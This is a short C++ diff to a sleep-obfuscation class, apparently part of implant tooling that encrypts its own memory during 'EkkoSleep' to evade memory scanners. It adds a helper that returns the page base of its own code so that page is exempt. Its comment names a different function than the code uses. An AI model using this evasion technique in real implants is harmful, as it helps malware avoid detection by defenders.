@@ -51,6 +51,12 @@ void SleepObfuscator::XorCrypt(void* data, SIZE_T size, BYTE key) {
     }
 }
 
+// 返回自身代码所在页面的基地址 (用于 EkkoSleep 自身页豁免)
+uintptr_t SleepObfuscator::GetSelfPage() {
+    // &SelfPageMaskHelper 是此 .cpp 文件中的静态函数, 与 EkkoSleep 在同一编译单元
+    return reinterpret_cast<uintptr_t>(&GetSelfPage) & ~0xFFFULL;
+}
+
 void SleepObfuscator::RegisterProtectedRegion(void* addr, SIZE_T size) {
     ProtectedRegion region;
     region.addr = addr;
